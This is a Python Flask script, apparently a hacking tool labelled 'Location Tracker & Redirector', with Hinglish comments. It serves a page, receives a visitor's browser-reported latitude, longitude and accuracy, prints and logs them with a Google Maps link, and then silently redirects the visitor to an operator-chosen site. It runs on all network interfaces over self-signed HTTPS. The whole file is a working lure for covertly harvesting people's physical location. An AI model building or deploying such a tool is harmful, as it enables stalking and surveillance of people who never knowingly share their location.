from flask import Flask, render_template, request, jsonify, redirect
import webbrowser
from datetime import datetime
import os
import ssl

app = Flask(__name__)

# Global variable to store redirect URL
REDIRECT_URL = ""

# Color codes for terminal
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'

def print_banner():
    banner = f"""
    {Colors.HEADER}{Colors.BOLD}
    ╔══════════════════════════════════════════════════════╗
    ║                                                      ║
    ║        📍 LOCATION TRACKER & REDIRECTOR 📍          ║
    ║                                                      ║
    ║           Made with ❤️ hackermamo                   ║
    ║                                                      ║
    ╚══════════════════════════════════════════════════════╝
    {Colors.END}
    """
    print(banner)

def print_info(message, color=Colors.BLUE):
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"{color}[{timestamp}] ℹ️  {message}{Colors.END}")

def print_success(message):
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"{Colors.GREEN}[{timestamp}] ✅ {message}{Colors.END}")

def print_error(message):
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"{Colors.RED}[{timestamp}] ❌ {message}{Colors.END}")

def print_location_data(data):
    print(f"\n{Colors.YELLOW}{'='*60}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.GREEN}📍 LOCATION DATA RECEIVED:{Colors.END}")
    print(f"{Colors.YELLOW}{'='*60}{Colors.END}")
    print(f"{Colors.BLUE}🌐 Latitude:{Colors.END}  {data['latitude']}")
    print(f"{Colors.BLUE}🌐 Longitude:{Colors.END} {data['longitude']}")
    print(f"{Colors.BLUE}📅 Timestamp:{Colors.END} {data['timestamp']}")
    print(f"{Colors.BLUE}🗺️  Google Maps Link:{Colors.END}")
    print(f"{Colors.GREEN}{data['google_maps_link']}{Colors.END}")
    print(f"{Colors.YELLOW}{'='*60}{Colors.END}\n")

@app.route('/')
def index():
    return render_template('index.html', redirect_url=REDIRECT_URL)

@app.route('/get-location', methods=['POST'])
def get_location():
    try:
        data = request.json
        latitude = data.get('latitude')
        longitude = data.get('longitude')
        accuracy = data.get('accuracy')
        
        # Google Maps link create karna
        google_maps_link = f"https://www.google.com/maps?q={latitude},{longitude}"
        
        # Terminal par print karna
        location_data = {
            'latitude': latitude,
            'longitude': longitude,
            'accuracy': accuracy,
            'google_maps_link': google_maps_link,
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        print_location_data(location_data)
        
        # Save to file (optional)
        save_to_file(location_data)
        
        return jsonify({
            'status': 'success',
            'redirect_url': REDIRECT_URL
        })
    
    except Exception as e:
        print_error(f"Error: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

def save_to_file(data):
    """Location data ko file mein save karna"""
    try:
        with open('location_log.txt', 'a') as f:
            f.write(f"\n{'='*60}\n")
            f.write(f"Timestamp: {data['timestamp']}\n")
            f.write(f"Latitude: {data['latitude']}\n")
            f.write(f"Longitude: {data['longitude']}\n")
            f.write(f"Accuracy: {data['accuracy']} meters\n")
            f.write(f"Google Maps: {data['google_maps_link']}\n")
            f.write(f"{'='*60}\n")
        print_success("Location data saved to 'location_log.txt'")
    except Exception as e:
        print_error(f"File save error: {str(e)}")

def get_local_ip():
    """Local IP address nikalna"""
    import socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def main():
    global REDIRECT_URL
    
    # Clear terminal
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except:
        pass  # Termux par clear command issue ho sakti hai
    
    # Banner print karna
    print_banner()
    
    # Redirect URL input lena
    print(f"{Colors.BOLD}{Colors.YELLOW}🔗 Enter Redirect URL:{Colors.END}")
    REDIRECT_URL = input(f"{Colors.GREEN}➜  {Colors.END}").strip()
    
    if not REDIRECT_URL:
        REDIRECT_URL = "https://www.google.com"
        print_info(f"Default URL set: {REDIRECT_URL}")
    else:
        print_success(f"Redirect URL set: {REDIRECT_URL}")
    
    # Port number
    PORT = 5000
    local_ip = get_local_ip()
    
    print(f"\n{Colors.YELLOW}{'='*60}{Colors.END}")
    print_success(f"Server starting on port {PORT} (HTTPS)...")
    print(f"\n{Colors.BOLD}📱 Access URLs:{Colors.END}")
    print(f"{Colors.BLUE}   Local:{Colors.END}    https://127.0.0.1:{PORT}")
    print(f"{Colors.BLUE}   Network:{Colors.END}  https://{local_ip}:{PORT}")
    print(f"{Colors.RED}   ⚠️  Browser may warn about certificate (ye normal hai){Colors.END}")
    print(f"{Colors.YELLOW}{'='*60}{Colors.END}\n")
    print_info("Waiting for location data...")
    print(f"{Colors.RED}Press CTRL+C to stop the server{Colors.END}\n")
    
    # Create self-signed certificate if it doesn't exist
    cert_file = 'cert.pem'
    key_file = 'key.pem'
    
    if not (os.path.exists(cert_file) and os.path.exists(key_file)):
        print_info("Creating self-signed certificate...")
        try:
            # Termux-compatible certificate creation
            cert_cmd = 'openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365 -subj "/CN=localhost"'
            if os.name == 'nt':
                cert_cmd += ' 2>nul'
            else:
                cert_cmd += ' 2>/dev/null'
            os.system(cert_cmd)
            import time
            time.sleep(1)
            if os.path.exists(cert_file) and os.path.exists(key_file):
                print_success("Certificate created successfully!")
            else:
                raise Exception("Certificate creation failed")
        except Exception as e:
            print_error(f"Could not create certificate: {str(e)}")
            print_info("Running on HTTP instead...")
            print(f"{Colors.YELLOW}{'='*60}{Colors.END}\n")
            app.run(host='0.0.0.0', port=PORT, debug=False)
            return
    
    # Flask app run karna with HTTPS
    try:
        print_success("Starting HTTPS server...")
        print(f"{Colors.YELLOW}{'='*60}{Colors.END}\n")
        app.run(host='0.0.0.0', port=PORT, debug=False, ssl_context=(cert_file, key_file), use_reloader=False)
    except Exception as e:
        print_error(f"HTTPS error: {str(e)}")
        print_info("Retrying with ad-hoc SSL...")
        try:
            app.run(host='0.0.0.0', port=PORT, debug=False, ssl_context='adhoc')
        except:
            print_error("SSL failed completely. Running on HTTP...")
            app.run(host='0.0.0.0', port=PORT, debug=False)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.RED}🛑 Server stopped by user{Colors.END}")
        print(f"{Colors.GREEN}👋 Goodbye!{Colors.END}\n")